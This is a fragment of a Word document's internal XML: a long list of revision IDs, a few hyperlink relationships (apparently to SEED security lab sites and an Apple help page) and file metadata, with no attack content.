    <w:rsid w:val="00521E19"/>
    <w:rsid w:val="00524AE1"/>
    <w:rsid w:val="005309F6"/>
    <w:rsid w:val="005371C8"/>
    <w:rsid w:val="005407F1"/>
    <w:rsid w:val="00546768"/>
    <w:rsid w:val="00547028"/>
    <w:rsid w:val="00550D12"/>
    <w:rsid w:val="005512C4"/>
    <w:rsid w:val="0055172A"/>
    <w:rsid w:val="00562D57"/>
    <w:rsid w:val="00563551"/>
    <w:rsid w:val="00564E32"/>
    <w:rsid w:val="005703F9"/>
    <w:rsid w:val="0057175E"/>
    <w:rsid w:val="00571AE1"/>
    <w:rsid w:val="00573C45"/>
    <w:rsid w:val="00576949"/>
    <w:rsid w:val="00582ECE"/>
    <w:rsid w:val="00590E09"/>
    <w:rsid w:val="00593030"/>
    <w:rsid w:val="005979EC"/>
    <w:rsid w:val="005A0F9B"/>
    <w:rsid w:val="005B08FF"/>
    <w:rsid w:val="005B419C"/>
    <w:rsid w:val="005B49BA"/>
    <w:rsid w:val="005B5AC3"/>
    <w:rsid w:val="005C5241"/>
    <w:rsid w:val="005D661A"/>
    <w:rsid w:val="005F3D5C"/>
    <w:rsid w:val="005F3F6B"/>
    <w:rsid w:val="005F458D"/>
    <w:rsid w:val="005F5872"/>
    <w:rsid w:val="00607BEF"/>
    <w:rsid w:val="00607CC5"/>
    <w:rsid w:val="0061548B"/>
    <w:rsid w:val="006203D9"/>
    <w:rsid w:val="00620F37"/>
    <w:rsid w:val="00623FAF"/>
    <w:rsid w:val="00626A16"/>
    <w:rsid w:val="00626DF2"/>
    <w:rsid w:val="00630101"/>
    <w:rsid w:val="00632F81"/>
    <w:rsid w:val="00635A19"/>
    <w:rsid w:val="00636AFB"/>
    <w:rsid w:val="00640EE1"/>
    <w:rsid w:val="00651D6A"/>
    <w:rsid w:val="00654338"/>
    <w:rsid w:val="006573ED"/>
    <w:rsid w:val="00664750"/>
    <w:rsid w:val="006706F5"/>
    <w:rsid w:val="0067239D"/>
    <w:rsid w:val="00673847"/>
    <w:rsid w:val="00680863"/>
    <w:rsid w:val="00686484"/>
    <w:rsid w:val="00695DB6"/>
    <w:rsid w:val="006A5D86"/>
    <w:rsid w:val="006A7D19"/>
    <w:rsid w:val="006B0648"/>
    <w:rsid w:val="006C2057"/>
    <w:rsid w:val="006C234A"/>
    <w:rsid w:val="006C5B6C"/>
    <w:rsid w:val="006C65CB"/>
    <w:rsid w:val="006C75F3"/>
    <w:rsid w:val="006D15BC"/>
    <w:rsid w:val="006D239F"/>
    <w:rsid w:val="006E1CB7"/>
    <w:rsid w:val="006E7427"/>
    <w:rsid w:val="006F4549"/>
    <w:rsid w:val="006F4DC8"/>
    <w:rsid w:val="0070189A"/>
    <w:rsid w:val="00711172"/>
    <w:rsid w:val="00712539"/>
    <w:rsid w:val="00712EAF"/>
    <w:rsid w:val="00717AFB"/>
    <w:rsid w:val="007230C5"/>
    <w:rsid w:val="00726262"/>
    <w:rsid w:val="00726BDE"/>
    <w:rsid w:val="00727F3A"/>
    <w:rsid w:val="00730184"/>
    <w:rsid w:val="00731472"/>
    <w:rsid w:val="00735212"/>
    <w:rsid w:val="007368B6"/>
    <w:rsid w:val="00737CE8"/>
    <w:rsid w:val="007435E8"/>
    <w:rsid w:val="00743CE9"/>
    <w:rsid w:val="00747263"/>
    <w:rsid w:val="0075279C"/>
    <w:rsid w:val="00756197"/>
    <w:rsid w:val="00763039"/>
    <w:rsid w:val="00763369"/>
    <w:rsid w:val="00766C78"/>
    <w:rsid w:val="007711E7"/>
    <w:rsid w:val="00773E0C"/>
    <w:rsid w:val="00775833"/>
    <w:rsid w:val="00780B77"/>
    <w:rsid w:val="00784D7A"/>
    <w:rsid w:val="00793086"/>
    <w:rsid w:val="0079457D"/>
    <w:rsid w:val="0079467F"/>
    <w:rsid w:val="00797E35"/>
    <w:rsid w:val="007A133E"/>
    <w:rsid w:val="007A2072"/>
    <w:rsid w:val="007A3129"/>
    <w:rsid w:val="007B2DE8"/>
    <w:rsid w:val="007B42CE"/>
    <w:rsid w:val="007B5A1C"/>
    <w:rsid w:val="007C127C"/>
    <w:rsid w:val="007D07D7"/>
    <w:rsid w:val="007D22C0"/>
    <w:rsid w:val="007D66CC"/>
    <w:rsid w:val="007E5BCC"/>
    <w:rsid w:val="007E6BFA"/>
    <w:rsid w:val="007F0F56"/>
    <w:rsid w:val="007F70A3"/>
    <w:rsid w:val="00800C9C"/>
    <w:rsid w:val="00800EB4"/>
    <w:rsid w:val="00804042"/>
    <w:rsid w:val="00813F46"/>
    <w:rsid w:val="00815211"/>
    <w:rsid w:val="00815531"/>
    <w:rsid w:val="00824958"/>
    <w:rsid w:val="00827CCE"/>
    <w:rsid w:val="00827F4F"/>
    <w:rsid w:val="00835563"/>
    <w:rsid w:val="00836951"/>
    <w:rsid w:val="00836B6A"/>
    <w:rsid w:val="00841966"/>
    <w:rsid w:val="00844B33"/>
    <w:rsid w:val="008510C4"/>
    <w:rsid w:val="008536A1"/>
    <w:rsid w:val="00857417"/>
    <w:rsid w:val="00871ED3"/>
    <w:rsid w:val="00871F9F"/>
    <w:rsid w:val="008728A3"/>
    <w:rsid w:val="00875AE6"/>
    <w:rsid w:val="00877071"/>
    <w:rsid w:val="0088096E"/>
    <w:rsid w:val="008814DD"/>
    <w:rsid w:val="008900CB"/>
    <w:rsid w:val="00892A1A"/>
    <w:rsid w:val="00893A78"/>
    <w:rsid w:val="00895D73"/>
    <w:rsid w:val="00896BC0"/>
    <w:rsid w:val="00897150"/>
    <w:rsid w:val="008A5C9E"/>
    <w:rsid w:val="008B4A9D"/>
    <w:rsid w:val="008B6E70"/>
    <w:rsid w:val="008C5749"/>
    <w:rsid w:val="008D4DDC"/>
    <w:rsid w:val="008D75A8"/>
    <w:rsid w:val="008E33E1"/>
    <w:rsid w:val="008E418C"/>
    <w:rsid w:val="008E67EF"/>
    <w:rsid w:val="008F09CD"/>
    <w:rsid w:val="008F3B97"/>
    <w:rsid w:val="008F4828"/>
    <w:rsid w:val="008F5CC9"/>
    <w:rsid w:val="0090090F"/>
    <w:rsid w:val="009013E7"/>
    <w:rsid w:val="009033A2"/>
    <w:rsid w:val="00911AA6"/>
    <w:rsid w:val="00911F5A"/>
    <w:rsid w:val="009219AE"/>
    <w:rsid w:val="00924496"/>
    <w:rsid w:val="00932353"/>
    <w:rsid w:val="009347B5"/>
    <w:rsid w:val="00936D92"/>
    <w:rsid w:val="00943B2F"/>
    <w:rsid w:val="0094508E"/>
    <w:rsid w:val="009512FE"/>
    <w:rsid w:val="00951457"/>
    <w:rsid w:val="009566C7"/>
    <w:rsid w:val="00956CE4"/>
    <w:rsid w:val="00957F0E"/>
    <w:rsid w:val="0096044C"/>
    <w:rsid w:val="009611BC"/>
    <w:rsid w:val="009739C4"/>
    <w:rsid w:val="00974A7C"/>
    <w:rsid w:val="00976F19"/>
    <w:rsid w:val="00980CCF"/>
    <w:rsid w:val="009842D2"/>
    <w:rsid w:val="00987070"/>
    <w:rsid w:val="009871F5"/>
    <w:rsid w:val="009905B4"/>
    <w:rsid w:val="009A148B"/>
    <w:rsid w:val="009A2639"/>
    <w:rsid w:val="009A46FA"/>
    <w:rsid w:val="009A519E"/>
    <w:rsid w:val="009A58CC"/>
    <w:rsid w:val="009B20B1"/>
    <w:rsid w:val="009C1F0E"/>
    <w:rsid w:val="009C2F5D"/>
    <w:rsid w:val="009C63F6"/>
    <w:rsid w:val="009D2BCD"/>
    <w:rsid w:val="009D5E05"/>
    <w:rsid w:val="009D6B0A"/>
    <w:rsid w:val="009D6F31"/>
    <w:rsid w:val="009E2D7B"/>
    <w:rsid w:val="009E3203"/>
    <w:rsid w:val="009E36E0"/>
    <w:rsid w:val="009E6C0E"/>
    <w:rsid w:val="009F5E2B"/>
    <w:rsid w:val="00A023BE"/>
    <w:rsid w:val="00A06514"/>
    <w:rsid w:val="00A11C34"/>
    <w:rsid w:val="00A12276"/>
    <w:rsid w:val="00A1310C"/>
    <w:rsid w:val="00A133E4"/>
    <w:rsid w:val="00A1510C"/>
    <w:rsid w:val="00A15D54"/>
    <w:rsid w:val="00A22220"/>
    <w:rsid w:val="00A25FC7"/>
    <w:rsid w:val="00A3174A"/>
    <w:rsid w:val="00A36000"/>
    <w:rsid w:val="00A409A6"/>
    <w:rsid w:val="00A447F4"/>
    <w:rsid w:val="00A44FEC"/>
    <w:rsid w:val="00A461C6"/>
    <w:rsid w:val="00A46EA1"/>
    <w:rsid w:val="00A5311B"/>
    <w:rsid w:val="00A57042"/>
    <w:rsid w:val="00A60B80"/>
    <w:rsid w:val="00A63361"/>
    <w:rsid w:val="00A67554"/>
    <w:rsid w:val="00A74B04"/>
    <w:rsid w:val="00A75F5B"/>
    <w:rsid w:val="00A809C4"/>
    <w:rsid w:val="00A81887"/>
    <w:rsid w:val="00A82486"/>
    <w:rsid w:val="00A870C7"/>
    <w:rsid w:val="00A879C7"/>
    <w:rsid w:val="00A95603"/>
    <w:rsid w:val="00AA62A8"/>
    <w:rsid w:val="00AB1BE7"/>
    <w:rsid w:val="00AB7393"/>
    <w:rsid w:val="00AB77B5"/>
    <w:rsid w:val="00AC3670"/>
    <w:rsid w:val="00AC539A"/>
    <w:rsid w:val="00AC7447"/>
    <w:rsid w:val="00AC7C87"/>
    <w:rsid w:val="00AE344D"/>
    <w:rsid w:val="00B22D68"/>
    <w:rsid w:val="00B252B1"/>
    <w:rsid w:val="00B2580F"/>
    <w:rsid w:val="00B337EE"/>
    <w:rsid w:val="00B3421C"/>
    <w:rsid w:val="00B515C0"/>
    <w:rsid w:val="00B60723"/>
    <w:rsid w:val="00B65095"/>
    <w:rsid w:val="00B65A68"/>
    <w:rsid w:val="00B71A5A"/>
    <w:rsid w:val="00B71C13"/>
    <w:rsid w:val="00B75E01"/>
    <w:rsid w:val="00B77819"/>
    <w:rsid w:val="00B83824"/>
    <w:rsid w:val="00B8573E"/>
    <w:rsid w:val="00B904FA"/>
    <w:rsid w:val="00B90EFD"/>
    <w:rsid w:val="00BB2D10"/>
    <w:rsid w:val="00BB30CF"/>
    <w:rsid w:val="00BB7E25"/>
    <w:rsid w:val="00BC63B8"/>
    <w:rsid w:val="00BD3E44"/>
    <w:rsid w:val="00BE0ADF"/>
    <w:rsid w:val="00BE33A7"/>
    <w:rsid w:val="00BE38F9"/>
    <w:rsid w:val="00BE749D"/>
    <w:rsid w:val="00BF51E2"/>
    <w:rsid w:val="00BF5570"/>
    <w:rsid w:val="00BF58B9"/>
    <w:rsid w:val="00C0444D"/>
    <w:rsid w:val="00C06D6C"/>
    <w:rsid w:val="00C07E91"/>
    <w:rsid w:val="00C107E0"/>
    <w:rsid w:val="00C11B23"/>
    <w:rsid w:val="00C17DEC"/>
    <w:rsid w:val="00C230F7"/>
    <w:rsid w:val="00C2495B"/>
    <w:rsid w:val="00C35182"/>
    <w:rsid w:val="00C356D4"/>
    <w:rsid w:val="00C45662"/>
    <w:rsid w:val="00C4683A"/>
    <w:rsid w:val="00C52FC2"/>
    <w:rsid w:val="00C54C07"/>
    <w:rsid w:val="00C56A0D"/>
    <w:rsid w:val="00C60A6B"/>
    <w:rsid w:val="00C610FF"/>
    <w:rsid w:val="00C6182C"/>
    <w:rsid w:val="00C662F9"/>
    <w:rsid w:val="00C66611"/>
    <w:rsid w:val="00C66717"/>
    <w:rsid w:val="00C66C7B"/>
    <w:rsid w:val="00C732D3"/>
    <w:rsid w:val="00C7374D"/>
    <w:rsid w:val="00C7562A"/>
    <w:rsid w:val="00C76DF5"/>
    <w:rsid w:val="00C831DE"/>
    <w:rsid w:val="00C849CC"/>
    <w:rsid w:val="00C84FB2"/>
    <w:rsid w:val="00C8693C"/>
    <w:rsid w:val="00C9720B"/>
    <w:rsid w:val="00C976C4"/>
    <w:rsid w:val="00CB09B7"/>
    <w:rsid w:val="00CB4DA0"/>
    <w:rsid w:val="00CB50CC"/>
    <w:rsid w:val="00CB5847"/>
    <w:rsid w:val="00CB7EAE"/>
    <w:rsid w:val="00CC479D"/>
    <w:rsid w:val="00CC6301"/>
    <w:rsid w:val="00CC6461"/>
    <w:rsid w:val="00CD4425"/>
    <w:rsid w:val="00CE3B51"/>
    <w:rsid w:val="00CE5FA5"/>
    <w:rsid w:val="00CE68A6"/>
    <w:rsid w:val="00CF1923"/>
    <w:rsid w:val="00CF7F13"/>
    <w:rsid w:val="00D00DA1"/>
    <w:rsid w:val="00D14AE1"/>
    <w:rsid w:val="00D173C6"/>
    <w:rsid w:val="00D203F7"/>
    <w:rsid w:val="00D215A7"/>
    <w:rsid w:val="00D2295C"/>
    <w:rsid w:val="00D24EE8"/>
    <w:rsid w:val="00D307B3"/>
    <w:rsid w:val="00D34F52"/>
    <w:rsid w:val="00D35D25"/>
    <w:rsid w:val="00D37945"/>
    <w:rsid w:val="00D4304F"/>
    <w:rsid w:val="00D4731C"/>
    <w:rsid w:val="00D6025F"/>
    <w:rsid w:val="00D605B7"/>
    <w:rsid w:val="00D61C9F"/>
    <w:rsid w:val="00D651B9"/>
    <w:rsid w:val="00D70E8D"/>
    <w:rsid w:val="00D7550A"/>
    <w:rsid w:val="00D75A41"/>
    <w:rsid w:val="00D75ED2"/>
    <w:rsid w:val="00D82731"/>
    <w:rsid w:val="00D9447C"/>
    <w:rsid w:val="00D97EF9"/>
    <w:rsid w:val="00DA0957"/>
    <w:rsid w:val="00DA5646"/>
    <w:rsid w:val="00DA6836"/>
    <w:rsid w:val="00DB6743"/>
    <w:rsid w:val="00DC4EBF"/>
    <w:rsid w:val="00DC58DB"/>
    <w:rsid w:val="00DC7E4B"/>
    <w:rsid w:val="00DD2D26"/>
    <w:rsid w:val="00DD67B8"/>
    <w:rsid w:val="00DE0754"/>
    <w:rsid w:val="00DE16A0"/>
    <w:rsid w:val="00DE279C"/>
    <w:rsid w:val="00DE56DA"/>
    <w:rsid w:val="00DE7EF8"/>
    <w:rsid w:val="00DF1811"/>
    <w:rsid w:val="00DF3303"/>
    <w:rsid w:val="00DF5C5E"/>
    <w:rsid w:val="00E011EB"/>
    <w:rsid w:val="00E04727"/>
    <w:rsid w:val="00E04DC1"/>
    <w:rsid w:val="00E06F1B"/>
    <w:rsid w:val="00E1036A"/>
    <w:rsid w:val="00E219CC"/>
    <w:rsid w:val="00E23398"/>
    <w:rsid w:val="00E42E05"/>
    <w:rsid w:val="00E479DF"/>
    <w:rsid w:val="00E47CAF"/>
    <w:rsid w:val="00E47D3F"/>
    <w:rsid w:val="00E53907"/>
    <w:rsid w:val="00E608E1"/>
    <w:rsid w:val="00E74646"/>
    <w:rsid w:val="00E82CAF"/>
    <w:rsid w:val="00E8364F"/>
    <w:rsid w:val="00E83FEA"/>
    <w:rsid w:val="00E845EC"/>
    <w:rsid w:val="00E91465"/>
    <w:rsid w:val="00E93450"/>
    <w:rsid w:val="00EA3B8B"/>
    <w:rsid w:val="00EA3BB9"/>
    <w:rsid w:val="00EB1C0C"/>
    <w:rsid w:val="00EC0F68"/>
    <w:rsid w:val="00EC5313"/>
    <w:rsid w:val="00ED05C7"/>
    <w:rsid w:val="00ED244E"/>
    <w:rsid w:val="00ED3106"/>
    <w:rsid w:val="00ED42C7"/>
    <w:rsid w:val="00EE1768"/>
    <w:rsid w:val="00EF7847"/>
    <w:rsid w:val="00F0386B"/>
    <w:rsid w:val="00F03E4A"/>
    <w:rsid w:val="00F06408"/>
    <w:rsid w:val="00F10531"/>
    <w:rsid w:val="00F10BE9"/>
    <w:rsid w:val="00F13D26"/>
    <w:rsid w:val="00F15E0C"/>
    <w:rsid w:val="00F16B9C"/>
    <w:rsid w:val="00F23755"/>
    <w:rsid w:val="00F25AA8"/>
    <w:rsid w:val="00F2646A"/>
    <w:rsid w:val="00F32FE9"/>
    <w:rsid w:val="00F3717F"/>
    <w:rsid w:val="00F400FF"/>
    <w:rsid w:val="00F41F95"/>
    <w:rsid w:val="00F43AF4"/>
    <w:rsid w:val="00F44245"/>
    <w:rsid w:val="00F45911"/>
    <w:rsid w:val="00F50B39"/>
    <w:rsid w:val="00F514BB"/>
    <w:rsid w:val="00F52765"/>
    <w:rsid w:val="00F53232"/>
    <w:rsid w:val="00F56411"/>
    <w:rsid w:val="00F57EC9"/>
    <w:rsid w:val="00F62B8E"/>
    <w:rsid w:val="00F67DD3"/>
    <w:rsid w:val="00F708AC"/>
    <w:rsid w:val="00F82C37"/>
    <w:rsid w:val="00F83FF4"/>
    <w:rsid w:val="00F858BD"/>
    <w:rsid w:val="00F873B0"/>
    <w:rsid w:val="00F95793"/>
    <w:rsid w:val="00F95CC3"/>
    <w:rsid w:val="00F9607B"/>
    <w:rsid w:val="00FA3129"/>
    <w:rsid w:val="00FA4C25"/>
    <w:rsid w:val="00FB0F4B"/>
    <w:rsid w:val="00FB1FC8"/>
    <w:rsid w:val="00FB34B5"/>
    <w:rsid w:val="00FB431B"/>
    <w:rsid w:val="00FB75F6"/>
    <w:rsid w:val="00FC66B9"/>
    <w:rsid w:val="00FC719C"/>
    <w:rsid w:val="00FD16DD"/>
    <w:rsid w:val="00FD25D5"/>
    <w:rsid w:val="00FE17B7"/>
    <w:rsid w:val="00FE1CDF"/>
    <w:rsid w:val="00FE657E"/>
    <w:rsid w:val="00FE69FA"/>
    <w:rsid w:val="00FE6DAF"/>
    <w:rsid w:val="00FF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6D739"/>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16.04/" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.seedlabsqlinjecti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yperlink" Target="http://www.csrflabattacker.com/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rflabelg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xsslabelgg.com/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://support.apple.com/guide/mac-help/get-macos-updates-mchlpx1065/m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4781</TotalTime>
  <Pages>16</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546</cp:revision>
  <cp:lastPrinted>2021-03-20T02:37:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-10-15T18:06:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-03-20T02:37:00Z</dcterms:modified>
</cp:coreProperties>
</file>